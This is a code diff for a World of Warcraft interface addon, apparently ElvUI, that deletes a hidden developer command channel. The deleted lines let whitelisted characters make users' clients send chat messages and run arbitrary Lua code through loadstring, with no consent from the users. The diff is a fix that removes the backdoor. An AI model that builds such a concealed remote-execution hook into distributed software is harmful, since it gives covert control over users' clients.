@@ -462,11 +462,6 @@ end
 local myName = E.myname.."-"..E.myrealm;
 myName = myName:gsub("%s+", "")
 local frames = {}
-local devAlts = {
-	['Elv-ShatteredHand'] = true,
-	['Sarah-ShatteredHand'] = true,
-	['Sara-ShatteredHand'] = true,
-}
 local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if(sender == myName) then return end
@@ -477,23 +472,6 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 				E:StaticPopup_Show("ELVUI_UPDATE_AVAILABLE")
 				E.recievedOutOfDateMessage = true
 			end
-		elseif (prefix == 'ELVUI_DEV_SAYS' or prefix == 'ELVUI_DEV_CMD') and devAlts[sender] == true and devAlts[myName] ~= true then
-			if prefix == 'ELVUI_DEV_SAYS' then
-				local user, channel, msg, sendTo = split("#", message)
-				
-				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
-					SendChatMessage(msg, channel, nil, sendTo)
-				end
-			else
-				local user, executeString = split("#", message)
-				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
-					local func, err = loadstring(executeString);
-					if not err then
-						E:Print(format("Developer Executed: %s", executeString))
-						func()
-					end
-				end			
-			end
 		end
 	else
 		E.SendMSGTimer = E:ScheduleTimer('SendMessage', 12)
@@ -501,8 +479,6 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 end
 
 RegisterAddonMessagePrefix('ELVUI_VERSIONCHK')
-RegisterAddonMessagePrefix('ELVUI_DEV_SAYS')
-RegisterAddonMessagePrefix('ELVUI_DEV_CMD')
 
 local f = CreateFrame('Frame')
 f:RegisterEvent("GROUP_ROSTER_UPDATE")
